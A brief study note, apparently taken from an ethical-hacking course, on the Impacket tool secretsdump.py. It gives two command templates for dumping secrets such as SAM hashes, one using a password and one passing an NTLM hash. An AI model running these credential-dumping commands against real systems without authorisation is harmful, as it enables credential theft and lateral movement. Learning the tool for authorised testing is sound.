secretsdump.py

---------------
from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course ; https://academy.tcm-sec.com/courses/1152300/lectures/48489922
- dumps many types of secrets (including SAM hashes)
syntax:
$ secretsdump.py <domain>/<username>:'<password>'@<target_ip>
OR
$ secretsdump.py <username>@<target_ip> -hashes <NTLMv1_hash>